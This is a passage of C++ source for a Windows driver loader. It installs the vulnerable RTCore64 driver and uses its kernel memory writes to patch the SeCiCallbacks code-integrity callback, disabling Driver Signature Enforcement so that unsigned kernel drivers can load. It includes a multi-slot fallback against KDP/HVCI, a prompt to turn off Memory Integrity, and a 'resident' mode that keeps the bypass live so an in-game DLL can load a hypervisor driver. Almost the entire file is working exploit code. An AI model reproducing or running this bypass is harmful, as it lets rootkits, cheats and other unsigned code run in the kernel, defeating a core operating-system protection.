// pointer that looks like a kernel-mode code address (0xFFFFF800_00000000+).
// This replaces the hardcoded +0x20 which is WRONG on Windows 11 build 26100+.
// ---------------------------------------------------------------------------
std::optional<uint64_t> DrvLoader::FindCallbackOffset(uint64_t seCiCallbacksVA, uint64_t ntBase) {
    // Kernel code addresses are in range 0xFFFFF80000000000+.
    // We need to distinguish real FUNCTION POINTERS from other kernel data:
    //
    //   REJECT: page-aligned values  (low 12 bits == 0)
    //           Real function pointers are never page-aligned.
    //           Image bases, module bases, DllBase fields etc. ARE page-aligned.
    //
    //   REJECT: exact ntBase value  (0xfffff804_X0000000)
    //           Some kernel structures store a self-reference to ntoskrnl's
    //           own image base, which passes the kernel-range test but is
    //           obviously not a CI callback function.
    //
    //   REJECT: pointers below ntBase + 0x1000
    //           The PE header is never executable code.
    constexpr uint64_t KBASE = 0xFFFFF80000000000ULL;

    for (uint64_t off = 0; off <= 0xF8; off += 4) {
        auto val = ReadMemory64(seCiCallbacksVA + off);
        if (!val) continue;

        if (*val < KBASE)             continue;  // not a kernel address
        if (*val == ntBase)           continue;  // exact image base — self-ref data
        if ((*val & 0x7) != 0)        continue;  // pointers must be 8-byte aligned
        if ((*val & 0xFFF) == 0)      continue;  // page-aligned — base address, not a fn ptr

        std::wcout << L"[+] Found CI callback pointer at SeCiCallbacks+0x"
                   << std::hex << off << L" = 0x" << *val << std::dec << L"\n";
        return off;
    }
    std::wcout << L"[-] Could not locate CI callback pointer in SeCiCallbacks structure\n";
    return std::nullopt;
}

bool DrvLoader::BypassDSEInternal() {
    // Strict resolution - no cache
    auto offsets = ResolveKernelOffsetsStrict();
    if (!offsets) {
        std::wcout << L"[-] Failed to resolve kernel offsets\n";
        return false;
    }

    auto [seCiOffset, zwFlushOffset] = *offsets;

    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        std::wcout << L"[-] Failed to get ntoskrnl.exe base address\n";
        return false;
    }

    std::wcout << L"[+] ntoskrnl.exe base: 0x" << std::hex << *ntBase << std::dec << L"\n";

    // Validate addresses before patching
    if (!ValidateKernelAddresses(*ntBase, seCiOffset, zwFlushOffset)) {
        std::wcout << L"[-] Address validation failed - aborting patch\n";
        return false;
    }

    uint64_t seCiCallbacks = *ntBase + seCiOffset;
    uint64_t safeFunction  = *ntBase + zwFlushOffset;

    // ---- Dynamically locate the real callback slot ----
    // Do NOT assume +0x20 — the layout differs across Windows builds.
    auto cbOff = FindCallbackOffset(seCiCallbacks, *ntBase);
    if (!cbOff) {
        std::wcout << L"[-] Aborting: cannot determine callback offset\n";
        return false;
    }
    uint64_t callbackToPatch = seCiCallbacks + *cbOff;

    // Save original values before patching
    originalCallbacks.clear();
    for (int i = 0; i < 3; i++) {
        uint64_t targetAddr = callbackToPatch + (i * 8);
        auto val = ReadMemory64(targetAddr);
        if (val) originalCallbacks.push_back(*val);
    }
    ConfigManager::SaveOriginalCallbacksToRegistry(originalCallbacks);
    // Remember WHICH boot produced this state.  After a restart the stored
    // addresses are stale and must never be replayed (see RestoreDSEInternal).
    ArtifactCompat::SavePatchBootStamp();
    patchedCallbackAddr = callbackToPatch;

    bool patchSuccess = false;

    // Attempt 1: Patch the table pointer in ntoskrnl (Original Method)
    if (WriteMemory64(callbackToPatch, safeFunction)) {
        auto verify = ReadMemory64(callbackToPatch);
        if (verify && *verify == safeFunction) {
            patchSuccess = true;
        }
    }

    // Attempt 2: If Attempt 1 failed (possibly due to KDP), try patching the table entries directly
    if (!patchSuccess) {
        // Save original values before patching
        originalCallbacks.clear();
        for (int i = 0; i < 8; i++) {
            uint64_t targetAddr = callbackToPatch + (i * 8);
            auto val = ReadMemory64(targetAddr);
            if (val) originalCallbacks.push_back(*val);
            else originalCallbacks.push_back(0); // placeholder
        }

        ConfigManager::SaveOriginalCallbacksToRegistry(originalCallbacks);
        ArtifactCompat::SavePatchBootStamp();
        patchedCallbackAddr = callbackToPatch;
        
        std::wcout << L"[*] Attempt 1 failed (KDP/HVCI?). Trying multi-slot forced write...\n";
        
        int patchedSlots = 0;
        for (int i = 0; i < (int)originalCallbacks.size(); i++) {
            uint64_t targetAddr = callbackToPatch + (i * 8);
            uint32_t low = (uint32_t)(safeFunction & 0xFFFFFFFF);
            uint32_t high = (uint32_t)(safeFunction >> 32);
            
            if (WriteMemory32(targetAddr, low) && WriteMemory32(targetAddr + 4, high)) {
                auto verify = ReadMemory64(targetAddr);
                if (verify && *verify == safeFunction) {
                    patchedSlots++;
                }
            }
        }

        if (patchedSlots > 0) {
            std::wcout << L"[+] Successfully patched " << patchedSlots << L" callback slots\n";
            patchSuccess = true;
        } else {
             std::wcout << L"[-] All patch attempts failed. Kernel memory is READ-ONLY (HVCI/KDP).\n";
             std::wcout << L"[!] Please ensure 'Memory Integrity' is DISABLED in Windows Security.\n";
        }
    }

    if (!patchSuccess) {
        return false;
    }

    std::wcout << L"[+] DSE bypass successful\n";
    return true;
}

bool DrvLoader::BypassDSE() {
    std::wcout << L"\n[=== DSE Bypass ===]\n";

    if (!InstallAndStartDriver()) return false;

    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE,
                          0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        StopAndRemoveDriver();
        return false;
    }

    bool result = BypassDSEInternal();

    if (!result) {
        // Patch failed — safe to clean up RTCore64
        Cleanup();
        StopAndRemoveDriver();
    }
    // On SUCCESS we intentionally keep RTCore64 loaded.
    // Unloading the helper driver while the CI callback still points to
    // ZwFlushInstructionCache will cause PatchGuard to detect the inconsistency
    // and trigger an immediate BSOD / system freeze.
    // RTCore64 + the patched callback will be cleaned up by RestoreDSE().
    else {
        std::wcout << L"[*] RTCore64 remains loaded while DSE is patched\n";
        std::wcout << L"[*] Call Restore DSE (option 1 again) to unload it safely\n";
    }

    return result;
}

bool DrvLoader::LoadDriver(const std::wstring& driverPath, DWORD startType, const std::wstring& dependencies) {
    return LoadDriverResidentImpl(driverPath, startType, dependencies, false);
}

bool DrvLoader::LoadDriverResident(const std::wstring& driverPath, DWORD startType,
                                   const std::wstring& dependencies) {
    return LoadDriverResidentImpl(driverPath, startType, dependencies, true);
}

bool DrvLoader::LoadDriverResidentImpl(const std::wstring& driverPath, DWORD startType,
                                       const std::wstring& dependencies, bool resident) {

    std::wstring normalizedPath = ConfigManager::NormalizeDriverPath(driverPath);
    std::wstring serviceName = ConfigManager::ExtractServiceName(normalizedPath);
    
    std::wcout << L"[*] Service: " << serviceName << L"\n";
    
    if (GetFileAttributesW(normalizedPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::wcout << L"[-] File not found: " << normalizedPath << L"\n";
        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
        return false;
    }

    // ------------------------------------------------------------------
    // DOUBLE-LOAD GUARD (added for ARTIFACT compatibility)
    //
    // ARTIFACT's artifact.dll installs its OWN kernel service pointing at the
    // very hyperkd.sys we are about to load.  hyperkd's DriverEntry has no
    // singleton protection, so a second instance re-initialises the global
    // hypervisor state and the game then executes VMX instructions in a
    // corrupt context -> 0xC0000096 STATUS_PRIVILEGED_INSTRUCTION.
    //
    // Refuse to load when another service already maps this exact file, and
    // point the user at the two safe routes: testsigning (let ARTIFACT own the
    // driver) or removing the other service first.
    // ------------------------------------------------------------------
    auto conflicts = ArtifactCompat::FindConflictingServices(normalizedPath, serviceName);
    if (!conflicts.empty()) {
        std::wcout << L"\n[!] Refusing to load: this driver is already mapped by another service\n";
        for (const auto& c : conflicts) {
            std::wcout << L"    - " << c << L"  (" << ArtifactCompat::GetServiceImagePath(c) << L")\n";
        }
        std::wcout << L"[!] hyperkd.sys has no singleton guard - two instances will corrupt the\n";
        std::wcout << L"[!] hypervisor state and the game will die with 0xC0000096.\n";
        std::wcout << L"[*] Safe options:\n";
        std::wcout << L"    1) testsigning is ON -> just let ARTIFACT install the driver itself\n";
        std::wcout << L"    2) drvloader remove <name>  (for each service listed above), then retry\n";
        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
        return false;
    }
    
    // Step 1: Install RTCore
    if (!InstallAndStartDriver()) return false;
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        StopAndRemoveDriver();
        return false;
    }
    
    // Step 2: Patch DSE
    if (!BypassDSEInternal()) {
        Cleanup();
        StopAndRemoveDriver();
        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
        return false;
    }
    
    // Step 3: Create and Start Target Service
    bool serviceSuccess = false;
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        // For kernel drivers, using the native NT path prefix (\??\) is most robust
        // and avoids issues with spaces without needing quotes.
        std::wstring binPath = normalizedPath;
        if (binPath.find(L"\\??\\") == std::wstring::npos) {
            binPath = L"\\??\\" + binPath;
        }
        
        std::wcout << L"[*] Binary path: " << binPath << L"\n";

        SC_HANDLE hService = CreateServiceW(hSCM, serviceName.c_str(), serviceName.c_str(),
            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, startType, SERVICE_ERROR_NORMAL,
            binPath.c_str(), nullptr, nullptr, dependencies.empty() ? nullptr : dependencies.c_str(), nullptr, nullptr);
            
        if (!hService) {
            DWORD err = GetLastError();
            if (err == ERROR_SERVICE_EXISTS || err == ERROR_SERVICE_MARKED_FOR_DELETE) {
                hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
                if (hService) {
                    // Update binary path in case it changed or to clear "marked for delete" state
                    ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, 
                                        SERVICE_NO_CHANGE, binPath.c_str(), nullptr, nullptr, 
                                        nullptr, nullptr, nullptr, nullptr);
                }
            } else {
                std::wcout << L"[-] Failed to create service (error: " << err << L")\n";
            }
        }
        
        if (hService) {
            if (StartServiceW(hService, 0, nullptr) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
                std::wcout << L"[+] Service started successfully\n";
                serviceSuccess = true;
            } else {
                std::wcout << L"[-] Failed to start service (error: 0x" << std::hex << GetLastError() << std::dec << L")\n";
            }
            CloseServiceHandle(hService);
        } else if (!serviceSuccess) {
            std::wcout << L"[-] Failed to open/create service handle\n";
        }
        CloseServiceHandle(hSCM);
    } else {
        std::wcout << L"[-] Failed to open SC Manager (error: " << GetLastError() << L")\n";
    }
    
    // Step 4: Restore DSE (only when not holding it open for ARTIFACT)
    if (resident && serviceSuccess) {
        // ------------------------------------------------------------------
        // ARTIFACT compatibility: keep the patch + RTCore64 alive.
        //
        // artifact.dll starts later, inside the game process, and installs its
        // OWN service on top of this driver through the plain SCM path.  If we
        // restore DSE here (load -> patch -> start -> restore), the SCM start
        // performed by artifact.dll is rejected with 0x80070241
        // ERROR_INVALID_IMAGE_HASH because the CI table is enforced again.
        // Keeping the patch live is what makes the whole chain work.
        // ------------------------------------------------------------------
        holdMode          = true;
        heldDriverPath    = normalizedPath;
        heldServiceName   = serviceName;
        std::wcout << L"[*] Resident mode: DSE stays patched, RTCore64 stays loaded\n";
        std::wcout << L"[*] Run 'drvloader restore' (or 'drvloader stop-hold') when done\n";
    } else {
        RestoreDSEInternal();
        Cleanup();
        StopAndRemoveDriver();
    }
    
    ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, serviceSuccess);
    return serviceSuccess;
}

// ============================================================================
// Hold mode — patch DSE without loading any target driver
// ============================================================================

bool DrvLoader::EnterHold() {
    std::wcout << L"\n[=== Hold DSE (resident) ===]\n";

    if (!InstallAndStartDriver()) return false;

    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE,
                          0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] Failed to open \\\\.\\RTCore64 (error " << GetLastError() << L")\n";
        StopAndRemoveDriver();
        return false;
    }

    // Already patched by an earlier run in this same process/boot?
    bool alreadyPatched = false;
    if (!originalCallbacks.empty() && patchedCallbackAddr) {
        auto cur = ReadMemory64(*patchedCallbackAddr);
        auto offsets = ResolveKernelOffsetsStrict();
        if (cur && offsets) {
            uint64_t safeFn = 0;
            auto ntBase = GetNtoskrnlBase();
            if (ntBase) safeFn = *ntBase + offsets->second;
            alreadyPatched = (safeFn && *cur == safeFn);
        }
    }

    if (!alreadyPatched) {
        if (!BypassDSEInternal()) {
            std::wcout << L"[-] DSE patch failed\n";
            Cleanup();
            StopAndRemoveDriver();
            return false;
        }
    } else {
        std::wcout << L"[*] DSE already patched - reusing existing patch\n";
    }

    holdMode = true;
    std::wcout << L"[+] Hold engaged: DSE is patched and RTCore64 stays loaded\n";
    std::wcout << L"[+] Services may now be started through the normal SCM path\n";
    return true;
}

bool DrvLoader::ExitHold() {
    std::wcout << L"\n[=== Release Hold ===]\n";

    bool restored = false;
    if (!originalCallbacks.empty()) {
        restored = RestoreDSE();
    } else {
        std::wcout << L"[*] No patch state held by this process\n";
        Cleanup();
        StopAndRemoveDriver();
        restored = true;
    }

    holdMode = false;
    heldDriverPath.clear();
    heldServiceName.clear();
    return restored;
}

bool DrvLoader::ReloadDriver(const std::wstring& driverPath) {
    std::wcout << L"\n[=== Reload Driver ===]\n";

    std::wstring normalizedPath = ConfigManager::NormalizeDriverPath(driverPath);
    std::wstring serviceName = ConfigManager::ExtractServiceName(normalizedPath);
    
    // Step 1: Install RTCore
    if (!InstallAndStartDriver()) return false;

    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        StopAndRemoveDriver();
        return false;
    }

    // Step 2: Stop target service if running
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
        if (hService) {
            SERVICE_STATUS_PROCESS ssp;
            DWORD needed;
            if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed)) {
                if (ssp.dwCurrentState == SERVICE_RUNNING) {
                     ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
                }
            }
            CloseServiceHandle(hService);
        }
        
        // Ensure service exists/recreated
        SC_HANDLE hCreate = CreateServiceW(hSCM, serviceName.c_str(), serviceName.c_str(),
             SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
             normalizedPath.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
        if (hCreate) CloseServiceHandle(hCreate);
        
        CloseServiceHandle(hSCM);
    }

    // Step 3: Patch DSE
    if (!BypassDSEInternal()) {
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }

    // Step 4: Start target service
    bool startSuccess = false;
    hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_START);
        if (hService) {
            if (StartServiceW(hService, 0, nullptr)) startSuccess = true;
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    // Step 5: Restore DSE
    RestoreDSEInternal();
    Cleanup();
    StopAndRemoveDriver();
    
    ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, SERVICE_DEMAND_START, startSuccess);
    return startSuccess;
}

bool DrvLoader::StopDriver(const std::wstring& serviceNameOrPath) {
    std::wcout << L"\n[=== Stop Driver ===]\n";
    
    std::wstring serviceName = ConfigManager::ExtractServiceName(serviceNameOrPath);
    std::wcout << L"[*] Service: " << serviceName << L"\n";
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        std::wcout << L"[-] Failed to open SCM\n";
        return false;
    }
    
    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        std::wcout << L"[-] Service not found\n";
        CloseServiceHandle(hSCM);
        return false;
    }
    
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
        if (ssp.dwCurrentState == SERVICE_STOPPED) {
            std::wcout << L"[*] Service is already stopped\n";
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }
    }
    
    SERVICE_STATUS status;
    if (ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        std::wcout << L"[+] Stop command sent\n";
    } else {
        std::wcout << L"[-] Failed to stop service (Error: " << GetLastError() << L")\n";
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return false;
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
}

bool DrvLoader::RemoveDriver(const std::wstring& serviceNameOrPath) {
    std::wcout << L"\n[=== Remove Driver ===]\n";
    
    std::wstring serviceName = ConfigManager::ExtractServiceName(serviceNameOrPath);
    std::wcout << L"[*] Service: " << serviceName << L"\n";
    
    // Stop it first using internal logic or SCM calls
    StopDriver(serviceName);
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;
    
    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), DELETE);
    if (!hService) {
        std::wcout << L"[-] Service not found or access denied\n";
        CloseServiceHandle(hSCM);
        return false;
    }
    
    if (DeleteService(hService)) {
        std::wcout << L"[+] Service marked for deletion\n";
    } else {
        std::wcout << L"[-] Failed to delete service (Error: " << GetLastError() << L")\n";
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
} 

bool DrvLoader::RestoreDSEInternal() {
    if (originalCallbacks.empty()) {
        std::wcout << L"[-] No original callback values available\n";
        return false;
    }

    // ------------------------------------------------------------------
    // STALE-STATE GUARD (added for ARTIFACT compatibility)
    //
    // `Initialize()` seeds originalCallbacks from HKCU when a previous patch
    // is recorded, even across reboots.  After a restart those stored kernel
    // addresses are meaningless: SeCiCallbacks already points at the real CI
    // functions again, and writing the old values back plants a stale pointer
    // into the callback slot — which is what produced the 0x0000000A /
    // freeze we hit while `restore` was run after a reboot.
    //
    // Rule: only replay registry state when we know we are in the same boot
    // that produced it, or when this process patched the slot itself
    // (patchedCallbackAddr has a value).
    // ------------------------------------------------------------------
    if (!patchedCallbackAddr && !ArtifactCompat::IsPatchStateFromCurrentBoot()) {
        std::wcout << L"[!] Ignoring patch state from a previous boot\n";
        std::wcout << L"[!] The kernel callback table was reset by the restart, so there is\n";
        std::wcout << L"[!] nothing to restore - replaying the stored addresses would write a\n";
        std::wcout << L"[!] stale pointer into SeCiCallbacks and can bugcheck the machine.\n";
        originalCallbacks.clear();
        ConfigManager::ClearPatchStateFromRegistry();
        ArtifactCompat::ClearPatchBootStamp();
        std::wcout << L"[+] Stale patch state discarded; DSE is already ACTIVE\n";
        return true;
    }

    // Determine the exact address to restore.
    // Prefer the address we recorded at patch time (patchedCallbackAddr);
    // if the process was restarted and only registry data is available,
    // re-scan the structure to find it.
    uint64_t callbackAddress = 0;

    if (patchedCallbackAddr) {
        callbackAddress = *patchedCallbackAddr;
        std::wcout << L"[+] Using stored patch address: 0x"
                   << std::hex << callbackAddress << std::dec << L"\n";
    } else {
        // Re-derive from symbols (process restarted after patch)
        auto offsets = ResolveKernelOffsetsStrict();
        if (!offsets) {
            std::wcout << L"[-] Failed to resolve kernel offsets for restore\n";
            return false;
        }
        auto [seCiOffset, zwFlushOffset] = *offsets;

        auto ntBase = GetNtoskrnlBase();
        if (!ntBase) {
            std::wcout << L"[-] Failed to get ntoskrnl.exe base address\n";
            return false;
        }

        if (!ValidateKernelAddresses(*ntBase, seCiOffset, zwFlushOffset)) {
            std::wcout << L"[-] Address validation failed\n";
            return false;
        }

        uint64_t seCiCallbacksVA = *ntBase + seCiOffset;
        auto cbOff = FindCallbackOffset(seCiCallbacksVA, *ntBase);
        if (!cbOff) {
            std::wcout << L"[-] Cannot locate callback offset for restore\n";
            return false;
        }
        callbackAddress = seCiCallbacksVA + *cbOff;
    }

    auto currentCallback = ReadMemory64(callbackAddress);
    if (!currentCallback) {
        std::wcout << L"[-] Failed to read current callback at 0x"
                   << std::hex << callbackAddress << std::dec << L"\n";
        return false;
    }

    // Already restored?
    if (*currentCallback == originalCallbacks[0]) {
        std::wcout << L"[+] DSE already restored\n";
        patchedCallbackAddr = std::nullopt;
        ConfigManager::ClearPatchStateFromRegistry();
        return true;
    }

    std::wcout << L"[*] Restoring callback:\n";
    std::wcout << L"    Address: 0x" << std::hex << callbackAddress << L"\n";
    std::wcout << L"    From:    0x" << *currentCallback << L"\n";
    std::wcout << L"    To:      0x" << originalCallbacks[0] << std::dec << L"\n";

    // Perform restoration for all patched slots
    int restoredSlots = 0;
    for (int i = 0; i < (int)originalCallbacks.size(); i++) {
        uint64_t targetAddr = callbackAddress + (i * 8);
        uint64_t targetVal = originalCallbacks[i];
        
        uint32_t low = (uint32_t)(targetVal & 0xFFFFFFFF);
        uint32_t high = (uint32_t)(targetVal >> 32);
        
        WriteMemory32(targetAddr, low);
        WriteMemory32(targetAddr + 4, high);
        
        auto verifyFinal = ReadMemory64(targetAddr);
        if (verifyFinal && *verifyFinal == targetVal) {
            restoredSlots++;
        }
    }

    if (restoredSlots == 0 && !originalCallbacks.empty()) {
        std::wcout << L"[-] Restoration verification failed\n";
        return false;
    }

    std::wcout << L"[+] DSE restored successfully (" << restoredSlots << L" slots)\n";
    originalCallbacks.clear();
    patchedCallbackAddr = std::nullopt;
    ConfigManager::ClearPatchStateFromRegistry();
    return true;
}

bool DrvLoader::RestoreDSE() {
    std::wcout << L"\n[=== Restore DSE ===]\n";
    if (originalCallbacks.empty()) {
        std::wcout << L"[-] No original callback state known\n";
        return false;
    }

    // If RTCore64 is already open (left loaded by BypassDSE), reuse the handle.
    // Otherwise install + open it now.
    bool driverWasAlreadyOpen = (hDriver != INVALID_HANDLE_VALUE);

    if (!driverWasAlreadyOpen) {
        if (!InstallAndStartDriver())
            return false;

        hDriver = CreateFileW(
            L"\\\\.\\RTCore64",
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr,
            OPEN_EXISTING,
            0, nullptr
        );

        if (hDriver == INVALID_HANDLE_VALUE) {
            StopAndRemoveDriver();
            return false;
        }
    } else {
        std::wcout << L"[*] Reusing already-open RTCore64 handle\n";
    }

    bool result = RestoreDSEInternal();

    // Always clean up RTCore64 after restore (success or failure)
    Cleanup();
    StopAndRemoveDriver();
    return result;
}
